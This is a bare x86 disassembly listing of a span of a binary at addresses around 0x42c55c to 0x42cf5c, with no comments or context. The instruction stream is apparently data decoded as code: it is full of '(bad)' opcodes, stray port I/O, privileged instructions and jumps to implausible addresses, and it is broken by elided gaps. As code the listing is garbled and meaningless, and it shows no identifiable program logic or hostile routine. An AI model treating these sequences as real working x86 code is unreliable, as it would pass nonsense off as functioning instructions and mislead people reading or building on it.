  42c55c:	mov    ch,0x5c
  42c55e:	test   eax,0x5fe462de
  42c563:	outs   dx,DWORD PTR ds:[esi]
  42c564:	cmp    ecx,DWORD PTR [edi+0x51811085]
  42c56a:	stos   DWORD PTR es:[edi],eax
  42c56b:	pop    es
  42c56c:	rcr    DWORD PTR [ebp+esi*2+0x1618fae6],0x80
  42c574:	sub    edx,DWORD PTR [ecx+0x37]
  42c577:	ins    BYTE PTR es:[edi],dx
  42c578:	mov    al,0x9c
  42c57a:	outs   dx,BYTE PTR ds:[esi]
  42c57b:	sub    bl,BYTE PTR [edx]
  42c57d:	mov    bh,0x36
  42c57f:	adc    edi,DWORD PTR [ecx-0x7257ba59]
  42c585:	(bad)  
  42c586:	icebp  
  42c587:	mov    ebp,DWORD PTR [edi+0x24cdb734]
  42c58d:	(bad)  
  42c58e:	adc    ch,BYTE PTR [ebx+0x34]
  42c591:	jmp    DWORD PTR [ebx+ecx*2+0x72afcdd3]
  42c598:	jp     0x42c5bf
  42c59a:	pop    edx
  42c59b:	cmp    ebp,esi
  42c59d:	test   al,0xd8
  42c59f:	cmc    
  42c5a0:	mov    ebp,0x75c2f1ec
  42c5a5:	mov    dl,0xf2
  42c5a7:	gs mov dh,0x70
  42c5aa:	cmp    DWORD PTR [edx-0x10],eax
  42c5ad:	pop    ds
  42c5ae:	dec    edx
  42c5af:	ret    0xd863
  42c5b2:	cmp    eax,0xa41
	...
  42c613:	add    BYTE PTR [eax],al
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	mov    ah,0x76
  42c624:	cmp    ch,BYTE PTR [eax+edx*1-0x25]
  42c628:	add    DWORD PTR [eax],eax
  42c62a:	pop    es
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    BYTE PTR [esi-0xe],bh
  42c630:	outs   dx,DWORD PTR ds:[esi]
  42c631:	xchg   edx,eax
  42c632:	std    
  42c633:	js     0x42c66e
  42c635:	jecxz  0x42c60e
  42c637:	into   
  42c638:	xchg   BYTE PTR [ebp+0xa],bh
  42c63b:	popf   
  42c63c:	mov    ch,0xc8
  42c63e:	inc    BYTE PTR [ecx+0x1a30e6ea]
  42c644:	push   es
  42c645:	adc    al,0x19
  42c647:	jg     0x42c662
  42c649:	cmp    eax,0x1b7a5772
  42c64e:	fucomi st,st(5)
  42c650:	out    0x57,al
  42c652:	in     al,dx
  42c653:	xchg   esi,eax
  42c654:	mov    ebp,0x6a4abef8
  42c659:	add    ecx,ecx
  42c65b:	daa    
  42c65c:	imul   ebp,DWORD PTR [edi+ecx*2-0x76],0x1d
  42c661:	cmc    
  42c662:	and    BYTE PTR [esi],dl
  42c664:	cmp    DWORD PTR [ebx],0xad306179
  42c66a:	inc    ecx
  42c66b:	push   0x77b325c
  42c670:	add    ah,dl
  42c672:	or     dl,BYTE PTR [eax+0x586126fb]
  42c678:	dec    eax
  42c679:	jne    0x42c69e
  42c67b:	jb     0x42c64f
  42c67d:	mov    edx,DWORD PTR [edi+edx*1]
  42c680:	jno    0x42c616
  42c682:	lods   eax,DWORD PTR ds:[esi]
  42c683:	nop
  42c684:	adc    BYTE PTR [ebp+0x33],0xe
  42c688:	push   esi
  42c689:	mov    al,0xaf
  42c68b:	aaa    
  42c68c:	adc    eax,0x6ea1c2be
  42c691:	aaa    
  42c692:	out    dx,eax
  42c693:	jb     0x42c6c2
  42c695:	test   BYTE PTR [ebp-0x7bae7bc],ch
  42c69b:	pop    ecx
  42c69c:	cmp    ah,BYTE PTR [eax+0x4aa10023]
  42c6a2:	retf   
  42c6a3:	xchg   edx,eax
  42c6a4:	test   al,0x87
  42c6a6:	inc    edx
  42c6a7:	shr    DWORD PTR [edx+0xe79fe6],cl
  42c6ad:	stos   BYTE PTR es:[edi],al
  42c6ae:	call   0x34609c57
  42c6b3:	add    dl,BYTE PTR [ecx+eiz*2-0x382d9493]
  42c6ba:	scas   eax,DWORD PTR es:[edi]
  42c6bb:	in     eax,0x0
  42c6bd:	faddp  st(6),st
  42c6bf:	and    DWORD PTR [edx-0x27],0x8b9443ed
  42c6c6:	adc    DWORD PTR [ebp+esi*4-0x77510535],0xfc725390
  42c6d1:	and    al,0x8
  42c6d3:	jo     0x42c67c
  42c6d5:	repnz mov bl,ah
  42c6d8:	in     eax,dx
  42c6d9:	(bad)
  42c6dc:	add    BYTE PTR [edi+0x17],ch
  42c6df:	fwait
  42c6e0:	js     0x42c705
  42c6e2:	aas    
  42c6e3:	push   esi
  42c6e4:	je     0x42c74c
  42c6e6:	aaa    
  42c6e7:	frstor [ebp+0x54722ebf]
  42c6ed:	int3   
  42c6ee:	xchg   DWORD PTR [edi+eiz*1],eax
  42c6f1:	fucomi st,st(2)
  42c6f3:	jl     0x42c6a5
  42c6f5:	mov    DWORD PTR [edi],eax
  42c6f7:	aam    0x8a
  42c6f9:	mov    dl,0x1f
  42c6fb:	ins    BYTE PTR es:[edi],dx
  42c6fc:	cmp    eax,0xcda411f9
  42c701:	lea    edx,[ebx+0x25]
  42c704:	cwde   
  42c705:	jge    0x42c750
  42c707:	les    esi,FWORD PTR [esi]
  42c709:	xchg   esi,eax
  42c70a:	mov    dh,0xd2
  42c70c:	ins    BYTE PTR es:[edi],dx
  42c70d:	xor    eax,0xa96ae510
  42c712:	mov    ch,ch
  42c714:	inc    edx
  42c715:	or     DWORD PTR [ebx],0x3
  42c718:	repnz mov ds:0xe301c3ae,eax
  42c71e:	stos   DWORD PTR es:[edi],eax
  42c71f:	cmp    eax,0x2618b7b5
  42c724:	mov    ?,WORD PTR [edx]
  42c726:	pop    ecx
  42c727:	mov    eax,ds:0xeb87e6b7
  42c72c:	xchg   ecx,eax
  42c72d:	jmp    0x42c794
  42c72f:	mov    bl,0xe7
  42c731:	mov    ds:0x31d45c,al
	...
  42c796:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c79c:	jmp    FWORD PTR [ebp+0x3f90a016]
  42c7a2:	sub    al,0x83
  42c7a4:	adc    eax,0x1dc177f
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [ebx+0x4010539e],dl
  42c7b3:	jne    0x42c76c
  42c7b5:	inc    edx
  42c7b6:	jecxz  0x42c765
  42c7b8:	or     ecx,eax
  42c7ba:	push   edx
  42c7bb:	mov    edi,0x39c55ba1
  42c7c0:	inc    edi
  42c7c1:	add    al,0x9a
  42c7c3:	(bad)  
  42c7c4:	jp     0x42c7b0
  42c7c6:	adc    BYTE PTR [esp+esi*8+0x5a426f2a],0xb4
  42c7ce:	pop    esp
  42c7cf:	cmc    
  42c7d0:	test   DWORD PTR [esi-0x5393f19d],esp
  42c7d6:	out    dx,al
  42c7d7:	lahf   
  42c7d8:	cs leave 
  42c7da:	fld1   
  42c7dc:	mov    ?,WORD PTR ds:0xa0fe2941
  42c7e2:	push   edx
  42c7e3:	mov    eax,0x3df83589
  42c7e8:	mov    dh,0xfd
  42c7ea:	cmp    BYTE PTR [ecx+eax*1],0x82
  42c7ee:	mov    bh,0x64
  42c7f0:	sbb    bh,dl
  42c7f2:	das    
  42c7f3:	cs hlt 
  42c7f5:	pop    DWORD PTR [edx+edi*4]
  42c7f8:	jmp    0xaee2011c
  42c7fd:	xchg   DWORD PTR [eax+0x32],esi
  42c800:	pop    ecx
  42c801:	add    eax,0x3c0fd774
  42c806:	fs mov esp,0x6f40a458
  42c80c:	add    BYTE PTR [edx+0x21c1d487],cl
  42c812:	cmp    al,0x9b
  42c814:	dec    edi
  42c815:	imul   ebp,DWORD PTR [edx+0x6b5d8114],0xc6c3485b
  42c81f:	(bad)  
  42c820:	xchg   edi,eax
  42c821:	leave  
  42c822:	sar    BYTE PTR [ebx],cl
  42c824:	int    0xe9
  42c826:	shl    BYTE PTR [edi],1
  42c828:	push   0x58c255c0
  42c82d:	push   edi
  42c82e:	or     ebp,DWORD PTR [ecx+0xc]
  42c831:	cld    
  42c832:	xor    eax,0xb19fb531
  42c837:	test   al,0xa4
  42c839:	dec    edx
  42c83a:	ror    BYTE PTR [ecx+0x42],0x6f
  42c83e:	push   cs
  42c83f:	xchg   ebx,eax
  42c840:	out    0x8c,al
  42c842:	push   cs
  42c843:	stos   BYTE PTR es:[edi],al
  42c844:	jp     0x42c8a1
  42c846:	inc    ebp
  42c847:	popa   
  42c848:	sub    eax,0xd90908f6
  42c84d:	adc    bl,BYTE PTR [eax-0x7bc16cb2]
  42c853:	xchg   edx,eax
  42c854:	pop    esp
  42c855:	cdq    
  42c856:	jge    0x42c828
  42c858:	jb     0x42c80b
  42c85a:	mov    ds:0x6e9de0c5,eax
  42c85f:	sbb    ebp,DWORD PTR [eax]
  42c861:	jnp    0x42c89b
  42c863:	push   edx
  42c864:	inc    edi
  42c865:	outs   dx,DWORD PTR fs:[esi]
  42c867:	mov    ?,WORD PTR [eax+0x22]
  42c86a:	repnz scas eax,DWORD PTR es:[edi]
  42c86c:	lahf   
  42c86d:	mov    edx,0xe8e80bd7
  42c872:	arpl   WORD PTR [ebp+0x1],ax
  42c875:	loop   0x42c8be
  42c877:	push   ebp
  42c878:	xchg   BYTE PTR [ebp+0x3cf6f823],al
  42c87e:	rol    BYTE PTR [ebx+ebx*8-0x5a],cl
  42c882:	rcl    DWORD PTR [esi+ebx*8],cl
  42c885:	pop    ss
  42c886:	jae    0x42c8bc
  42c888:	and    dl,0x4b
  42c88b:	xor    edi,DWORD PTR [edi-0x2a]
  42c88e:	bsf    edi,ebp
  42c891:	mov    esi,0xe0bb87ba
  42c896:	push   edx
  42c897:	mov    BYTE PTR [ebp+0x9],ah
  42c89a:	mov    bh,BYTE PTR [ecx-0x30]
  42c89d:	jnp    0x42c89e
  42c89f:	sbb    DWORD PTR [eax+0x565284f6],0x6b3757cc
  42c8a9:	dec    ecx
  42c8aa:	scas   al,BYTE PTR es:[edi]
  42c8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8ac:	jnp    0x42c8da
  42c8ae:	cld    
  42c8af:	out    dx,eax
  42c8b0:	gs dec esp
  42c8b2:	data16 mov WORD PTR [ebx+0x0],gs
	...
  42c915:	add    BYTE PTR [eax],dl
  42c917:	sbb    ecx,ecx
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	xlat   BYTE PTR ds:[ebx]
  42c923:	pop    eax
  42c924:	ret    0x1e56
  42c927:	fld    QWORD PTR [ecx]
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    ah,bl
  42c92f:	lea    eax,[eax-0xd]
  42c932:	popa   
  42c933:	popf   
  42c934:	adc    al,0x98
  42c936:	shl    DWORD PTR [eax],1
  42c938:	aaa    
  42c939:	push   ebp
  42c93a:	mov    ebp,0xd0efbc5f
  42c93f:	adc    al,BYTE PTR [edx+eiz*1+0x79]
  42c943:	jp     0x42c979
  42c945:	fldcw  WORD PTR [edi+edi*1]
  42c948:	or     edx,ecx
  42c94a:	pop    edx
  42c94b:	and    eax,0x9b27379a
  42c950:	sbb    ecx,DWORD PTR [ecx+0x49]
  42c953:	adc    al,BYTE PTR [ebp-0x37]
  42c956:	sub    esi,ecx
  42c958:	push   edi
  42c959:	mov    ah,ch
  42c95b:	rol    DWORD PTR [edi],cl
  42c95d:	repnz add BYTE PTR [ebx+0x11],0xc8
  42c962:	jl     0x42c972
  42c964:	cmp    BYTE PTR gs:[eax+0x37e367d6],ah
  42c96b:	mov    bh,0x6f
  42c96d:	cmp    DWORD PTR [ecx+0x75],edi
  42c970:	push   eax
  42c971:	add    al,0x2
  42c973:	mov    eax,ds:0x86d29847
  42c978:	inc    ecx
  42c979:	jno    0x42c99d
  42c97b:	cmp    edx,edi
  42c97d:	popf   
  42c97e:	les    edi,FWORD PTR [eax-0x2e]
  42c981:	out    dx,al
  42c982:	pop    es
  42c983:	dec    eax
  42c984:	mov    ecx,0xd03630df
  42c989:	or     eax,0xf75431ea
  42c98e:	cld    
  42c98f:	fdiv   QWORD PTR [ebp+edx*8+0x3e9fe33f]
  42c996:	call   0xb6e0c599
  42c99b:	mov    gs,WORD PTR [eax-0x41c58899]
  42c9a1:	xlat   BYTE PTR ds:[ebx]
  42c9a2:	cmp    dl,BYTE PTR [ebp-0x33]
  42c9a5:	ja     0x42c978
  42c9a7:	adc    DWORD PTR [edi+0x540f5f12],0xffffff8d
  42c9ae:	dec    edx
  42c9af:	mov    ebx,0xa6df9d1e
  42c9b4:	daa    
  42c9b5:	push   ebx
  42c9b6:	idiv   ecx
  42c9b8:	ffreep st(0)
  42c9ba:	ins    BYTE PTR es:[edi],dx
  42c9bb:	mov    esp,0x5a192933
  42c9c0:	push   esi
  42c9c1:	test   BYTE PTR [ecx+eax*1+0x58],bl
  42c9c5:	mov    edi,0x210da87
  42c9ca:	repz iret 
  42c9cc:	and    DWORD PTR [esi+0x3c2c6e46],esi
  42c9d2:	lahf   
  42c9d3:	(bad)  
  42c9d5:	mov    BYTE PTR [eax],bl
  42c9d7:	retf   0x9d31
  42c9da:	jns    0x42ca1a
  42c9dc:	jmp    0x7c42c9d3
  42c9e1:	xchg   ebp,eax
  42c9e2:	in     eax,dx
  42c9e3:	jbe    0x42c9e7
  42c9e5:	jmp    eax
  42c9e7:	jne    0x42c98f
  42c9e9:	add    bl,ch
  42c9eb:	outs   dx,DWORD PTR ds:[esi]
  42c9ec:	push   edx
  42c9ed:	cld    
  42c9ee:	shl    cl,cl
  42c9f0:	cmp    ah,0xc6
  42c9f3:	retf   
  42c9f4:	push   esi
  42c9f5:	mov    eax,ds:0xf55c58e1
  42c9fa:	rol    DWORD PTR [ebx],1
  42c9fc:	jg     0x42ca14
  42c9fe:	rcl    DWORD PTR [ecx-0x234d1a4d],0xca
  42ca05:	pop    esi
  42ca06:	es inc esi
  42ca08:	pushf  
  42ca09:	push   0x76
  42ca0b:	repz femms 
  42ca0e:	and    al,0xd4
  42ca10:	mov    ebx,ebp
  42ca12:	mov    esi,ebp
  42ca14:	add    dl,BYTE PTR [eax+0x53]
  42ca17:	dec    edi
  42ca18:	shl    DWORD PTR [edx+ebp*8-0x73978a8],1
  42ca1f:	mov    edx,0xf5e3c5c7
  42ca24:	cld    
  42ca25:	xchg   DWORD PTR [ebp-0x1c107393],ecx
  42ca2b:	das    
  42ca2c:	lods   eax,DWORD PTR ds:[esi]
  42ca2d:	pop    edx
  42ca2e:	shl    DWORD PTR [ecx+edi*2+0x25],cl
  42ca32:	dec    edx
  42ca33:	sub    al,0xec
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0x13f26ff4,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [ebx+eax*2-0x50],ah
  42cab1:	or     eax,0x7593332
  42cab6:	xchg   ecx,eax
  42cab7:	cwde   
  42cab8:	mov    ch,0xb4
  42caba:	jmp    0x63685b5d
  42cabf:	pusha  
  42cac0:	or     eax,0xe4ac10c0
  42cac5:	inc    esp
  42cac6:	ins    BYTE PTR es:[edi],dx
  42cac7:	dec    ebx
  42cac8:	sub    ecx,esp
  42caca:	shl    BYTE PTR [esi+0x77],0x34
  42cace:	push   eax
  42cacf:	pop    ds
  42cad0:	iret   
  42cad1:	stos   BYTE PTR es:[edi],al
  42cad2:	je     0x42ca78
  42cad4:	stc    
  42cad5:	xor    BYTE PTR [esi+ebx*4+0x7b],0xe0
  42cada:	inc    ebp
  42cadb:	out    0x86,eax
  42cadd:	fsubr  QWORD PTR [esi+0x791b8866]
  42cae3:	arpl   WORD PTR [edx+0x5c69ff8b],cx
  42cae9:	sub    al,0x28
  42caeb:	adc    ebp,DWORD PTR [ecx-0x59]
  42caee:	pop    ss
  42caef:	scas   al,BYTE PTR es:[edi]
  42caf0:	pop    eax
  42caf1:	mov    eax,ds:0xd7eeafe5
  42caf6:	and    ch,dl
  42caf8:	sbb    al,0x9a
  42cafa:	and    eax,0x30e1b26b
  42caff:	gs shr esp,0x21
  42cb03:	and    ebx,DWORD PTR [ebx+ecx*4+0x49]
  42cb07:	push   esp
  42cb08:	xlat   BYTE PTR ds:[ebx]
  42cb09:	bnd ret 0xc4c0
  42cb0d:	fs add al,0x79
  42cb10:	inc    ecx
  42cb11:	cmp    dl,bl
  42cb13:	add    DWORD PTR [ebx+eiz*8+0x69],esi
  42cb17:	in     eax,0xdc
  42cb19:	sub    al,0x70
  42cb1b:	cwde   
  42cb1c:	jecxz  0x42caa6
  42cb1e:	push   cs
  42cb1f:	cdq    
  42cb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb21:	lds    ebx,FWORD PTR [esi-0x72]
  42cb24:	in     eax,0x46
  42cb26:	inc    esi
  42cb27:	ins    BYTE PTR es:[edi],dx
  42cb28:	or     al,0x64
  42cb2a:	out    dx,eax
  42cb2b:	push   eax
  42cb2c:	mov    ch,0x49
  42cb2e:	popa   
  42cb2f:	cmp    esp,DWORD PTR [ebp+0x7832f679]
  42cb35:	cld    
  42cb36:	repnz iret 
  42cb38:	pop    ebp
  42cb39:	test   BYTE PTR [eax],0xbd
  42cb3c:	lock in al,0x88
  42cb3f:	cmp    bh,BYTE PTR [esi-0x1f]
  42cb42:	sbb    BYTE PTR [ebx-0x35],0x60
  42cb46:	cmp    DWORD PTR [ecx-0x74],ebx
  42cb49:	fistp  WORD PTR [ecx]
  42cb4b:	mov    dl,bh
  42cb4d:	gs ins BYTE PTR es:[edi],dx
  42cb4f:	and    DWORD PTR [ebp-0x1],ebx
  42cb52:	ins    DWORD PTR es:[edi],dx
  42cb53:	ss (bad) 
  42cb55:	scas   al,BYTE PTR es:[edi]
  42cb56:	mov    ebx,0xa4872e3a
  42cb5b:	mov    ss:0x1dabb4e7,eax
  42cb61:	xchg   DWORD PTR [esi+0x47fa8992],ebx
  42cb67:	mov    WORD PTR [edi-0x25],es
  42cb6a:	retf   0x3cc4
  42cb6d:	adc    eax,0xb4cebab7
  42cb72:	or     eax,0xe10ff2d7
  42cb77:	cmc    
  42cb78:	push   esi
  42cb79:	adc    al,0xa5
  42cb7b:	jmp    0x48d8:0xa215c81f
  42cb82:	shl    bh,cl
  42cb84:	cmc    
  42cb85:	jbe    0x42cb1e
  42cb87:	adc    DWORD PTR [ebx],ebp
  42cb89:	jmp    0x42cbd6
  42cb8b:	lods   eax,DWORD PTR ds:[esi]
  42cb8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb8d:	rcr    BYTE PTR [ebx],1
  42cb8f:	adc    BYTE PTR [esi-0x4d],dh
  42cb92:	xchg   ecx,eax
  42cb93:	cdq    
  42cb94:	sbb    ch,bh
  42cb96:	mov    bl,0x50
  42cb98:	les    ebp,FWORD PTR [edi-0xc2fe528]
  42cb9e:	push   ecx
  42cb9f:	rcr    DWORD PTR [edx-0x5a],0xb6
  42cba3:	xor    al,0x68
  42cba5:	or     esi,DWORD PTR [ebp+0x19650796]
  42cbab:	xchg   esi,eax
  42cbac:	(bad)  
  42cbad:	cmc    
  42cbae:	ins    DWORD PTR es:[edi],dx
  42cbaf:	into   
  42cbb0:	mov    ch,0x7b
  42cbb2:	inc    ebx
  42cbb3:	push   0x25
	...
  42cc14:	add    BYTE PTR [eax],al
  42cc16:	jg     0x42cc1a
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	jl     0x42cbb1
  42cc24:	xor    ecx,DWORD PTR [ecx]
  42cc26:	sub    al,0xdf
  42cc28:	add    DWORD PTR [eax],eax
  42cc2a:	pop    es
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    dl,al
  42cc2f:	push   ecx
  42cc30:	mov    BYTE PTR [esi],dl
  42cc32:	mov    eax,0x186f78f
  42cc37:	js     0x42cc87
  42cc39:	mov    al,ds:0x3d92d7
  42cc3e:	rol    BYTE PTR fs:[ecx-0x40167e39],cl
  42cc45:	gs jb  0x42cc57
  42cc48:	push   ss
  42cc49:	pop    ds
  42cc4a:	jl     0x42cc6d
  42cc4c:	push   es
  42cc4d:	jnp    0x42cbdf
  42cc4f:	push   0x63dd5e80
  42cc54:	loopne 0x42cc53
  42cc56:	dec    ebx
  42cc57:	fs jb  0x42ccb5
  42cc5a:	ins    BYTE PTR es:[edi],dx
  42cc5b:	sar    ch,1
  42cc5d:	xor    BYTE PTR [ebp-0x70275c2d],ah
  42cc63:	mov    ebx,0x72e76930
  42cc68:	retf   0x4339
  42cc6b:	xlat   BYTE PTR ds:[ebx]
  42cc6c:	(bad)  
  42cc6d:	daa    
  42cc6e:	clc    
  42cc6f:	inc    si
  42cc71:	or     al,0x81
  42cc73:	outs   dx,BYTE PTR ds:[esi]
  42cc74:	jge    0x42cce1
  42cc76:	inc    esi
  42cc77:	(bad)  
  42cc78:	idiv   BYTE PTR [ebp+0x3b130789]
  42cc7e:	mov    esp,0x1d17a09
  42cc83:	pop    esi
  42cc84:	cmp    ebp,DWORD PTR ds:0x60b170e6
  42cc8a:	pop    eax
  42cc8b:	data16 fcmovnu st,st(7)
  42cc8e:	cmp    DWORD PTR [eax+0x48a5a9e],ebx
  42cc94:	xor    DWORD PTR gs:[esi-0x46211164],esp
  42cc9b:	je     0x42cd00
  42cc9d:	out    dx,eax
  42cc9e:	aaa    
  42cc9f:	nop
  42cca0:	cli    
  42cca1:	mov    ds:0x733d3efc,eax
  42cca6:	add    eax,0x1cb5aa82
  42ccab:	inc    edi
  42ccac:	mov    ah,0xc4
  42ccae:	stos   BYTE PTR es:[edi],al
  42ccaf:	in     eax,dx
  42ccb0:	leave  
  42ccb1:	sti    
  42ccb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccb3:	iret   
  42ccb4:	mov    edx,DWORD PTR [edi+edi*8]
  42ccb7:	(bad)  
  42ccb8:	push   ecx
  42ccb9:	out    0xbc,al
  42ccbb:	pop    ebp
  42ccbc:	daa    
  42ccbd:	test   al,0x57
  42ccbf:	mov    ebx,0xe2422d89
  42ccc4:	add    BYTE PTR [ecx],al
  42ccc6:	je     0x42cd1f
  42ccc8:	daa    
  42ccc9:	test   BYTE PTR [ebp-0x5f],cl
  42cccc:	test   DWORD PTR [eax+ebx*8+0x17],eax
  42ccd0:	mov    bh,0x98
  42ccd2:	add    eax,0x3ca3f6d2
  42ccd7:	push   ss
  42ccd8:	not    ch
  42ccda:	dec    ebp
  42ccdb:	daa    
  42ccdc:	xchg   ebp,eax
  42ccdd:	jns    0x42ccf0
  42ccdf:	fst    DWORD PTR [edx+0x1a401b43]
  42cce5:	xor    BYTE PTR [eax],0x24
  42cce8:	lock cmp eax,0xc3e6f872
  42ccee:	and    esi,DWORD PTR [edx-0x47dd7b9b]
  42ccf4:	pop    esi
  42ccf5:	loopne 0x42cc90
  42ccf7:	enter  0xb044,0xd0
  42ccfb:	div    BYTE PTR [edx]
  42ccfd:	ds mov bl,0x4a
  42cd00:	mov    eax,0x5677a89e
  42cd05:	cli    
  42cd06:	cmp    BYTE PTR [edx-0x20f3cc7f],dh
  42cd0c:	int    0xae
  42cd0e:	stos   DWORD PTR es:[edi],eax
  42cd0f:	push   ecx
  42cd10:	xchg   edx,eax
  42cd11:	jnp    0x42cce0
  42cd13:	dec    eax
  42cd14:	adc    esp,ebp
  42cd16:	adc    edi,DWORD PTR [ebx-0xff1cf92]
  42cd1c:	xor    ah,cl
  42cd1e:	mov    esp,DWORD PTR [eax+0x4c]
  42cd21:	sbb    ecx,esi
  42cd23:	jae    0x42ccb5
  42cd25:	lock loopne 0x42cd49
  42cd28:	mov    ah,ch
  42cd2a:	and    al,dh
  42cd2c:	std    
  42cd2d:	ror    edx,0x70
  42cd30:	in     eax,0x71
  42cd32:	mov    bl,0x6a
  42cd34:	jo     0x42cd36
	...
  42cd96:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	inc    esp
  42cda3:	and    eax,0xe0336700
  42cda8:	add    DWORD PTR [eax],eax
  42cdaa:	pop    es
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [esi-0x26],bl
  42cdb0:	and    eax,0x34d2a458
  42cdb5:	xchg   DWORD PTR [ebp+0x6a],ebx
  42cdb8:	mov    bh,cl
  42cdba:	mov    esp,0x494401f2
  42cdbf:	mov    ds,WORD PTR [ebx+eiz*1]
  42cdc2:	es das 
  42cdc4:	test   DWORD PTR [edx],ebp
  42cdc6:	pop    ebx
  42cdc7:	or     BYTE PTR [ebp-0x1b0d8ad8],bh
  42cdcd:	das    
  42cdce:	(bad)  
  42cdcf:	fisttp DWORD PTR [ecx-0x64e8f146]
  42cdd5:	xchg   ecx,eax
  42cdd6:	loopne 0x42ce21
  42cdd8:	inc    ebx
  42cdd9:	or     BYTE PTR [esi-0x73eb5123],dl
  42cddf:	jnp    0x42ce05
  42cde1:	cmp    BYTE PTR [ebx-0x210bf26e],bl
  42cde7:	add    DWORD PTR [edi-0x3b5d51fc],esi
  42cded:	and    dh,BYTE PTR [edi+0x77]
  42cdf0:	jns    0x42cdb6
  42cdf2:	push   0xc70f4f60
  42cdf7:	scas   al,BYTE PTR es:[edi]
  42cdf8:	fst    DWORD PTR [edx+0x73]
  42cdfb:	mov    ds:0xf1455ce0,al
  42ce00:	inc    edx
  42ce01:	(bad)  
  42ce02:	enter  0xcd75,0x5
  42ce06:	cmp    esp,DWORD PTR [ebp+ebp*8+0x7a9f36bb]
  42ce0d:	push   es
  42ce0e:	mov    cl,0xff
  42ce10:	out    0xb4,eax
  42ce12:	sbb    al,0xf2
  42ce14:	xor    edi,edx
  42ce16:	add    DWORD PTR ds:0x5973d63,edi
  42ce1c:	sar    ch,1
  42ce1e:	inc    edx
  42ce1f:	into   
  42ce20:	dec    edx
  42ce21:	fadd   DWORD PTR [eax-0x71]
  42ce24:	aad    0xe0
  42ce26:	sahf   
  42ce27:	xor    ebx,DWORD PTR [ecx+ebx*4-0x6ddb2103]
  42ce2e:	dec    ebx
  42ce2f:	or     ebp,DWORD PTR [edi]
  42ce31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce32:	jecxz  0x42ce2f
  42ce34:	mov    ecx,0xc5118b72
  42ce39:	jl     0x42ce99
  42ce3b:	mov    al,ds:0xccf50cf8
  42ce40:	push   cs
  42ce41:	scas   eax,DWORD PTR es:[edi]
  42ce42:	jle    0x42ce79
  42ce44:	popf   
  42ce45:	sub    edx,DWORD PTR [ebx+edi*4+0x37]
  42ce49:	or     ecx,edx
  42ce4b:	or     eax,0x4a11b088
  42ce50:	mov    ebx,0x49b8f29f
  42ce55:	sbb    DWORD PTR [eax-0x686c0cea],eax
  42ce5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce5c:	in     eax,dx
  42ce5d:	jg     0x42ce6b
  42ce5f:	pop    ebp
  42ce60:	xchg   eax,esi
  42ce62:	mov    ds:0xcd6fa7d9,eax
  42ce67:	mov    ds:0xa79a20be,al
  42ce6c:	loopne 0x42ce51
  42ce6e:	add    eax,0x91fe51e4
  42ce73:	pop    ss
  42ce74:	enter  0x33e2,0xe5
  42ce78:	jnp    0x42cecd
  42ce7a:	enter  0x8248,0xe9
  42ce7e:	in     al,dx
  42ce7f:	cdq    
  42ce80:	retf   0xd5ab
  42ce83:	mov    ds:0x422f6c03,al
  42ce88:	mov    edi,0x9014a352
  42ce8d:	mov    ah,0xf4
  42ce8f:	out    0xc5,eax
  42ce91:	sub    ebx,0x61c7c87c
  42ce97:	jle    0x42ce62
  42ce99:	nop
  42ce9a:	xchg   DWORD PTR ds:0x20ff4d2e,ecx
  42cea0:	pop    ebx
  42cea1:	mov    ecx,0x1a6d2560
  42cea6:	repnz fmul DWORD PTR [ecx+ebp*4-0x43297a23]
  42ceae:	inc    edi
  42ceaf:	or     BYTE PTR [edi+0x19],al
  42ceb2:	inc    esi
  42ceb3:	jb     0x42ceb0
	...
  42cf15:	add    BYTE PTR [ebx+0x3d],dh
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx-0x4b59d2ef]
  42cf24:	push   ebp
  42cf25:	sbb    DWORD PTR [edx],edi
  42cf27:	loope  0x42cf2a
  42cf29:	add    BYTE PTR [edi],al
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    cl,ah
  42cf2f:	mov    edx,0x85bce5fd
  42cf34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf35:	sahf   
  42cf36:	mov    eax,ds:0x42c6633b
  42cf3b:	ins    BYTE PTR es:[edi],dx
  42cf3c:	daa    
  42cf3d:	jmp    0xbabf:0xd0f1426e
  42cf44:	mov    esi,0x32f75588
  42cf49:	popa   
  42cf4a:	sub    esp,DWORD PTR [esp+eax*2]
  42cf4d:	repnz mov DWORD PTR [ebx+0x7b],ebx
  42cf51:	inc    eax
  42cf52:	test   eax,0xa0c3ebcb
  42cf57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf58:	sub    DWORD PTR [edi],esi
  42cf5a:	ror    BYTE PTR [edx],1
  42cf5c:	retf   
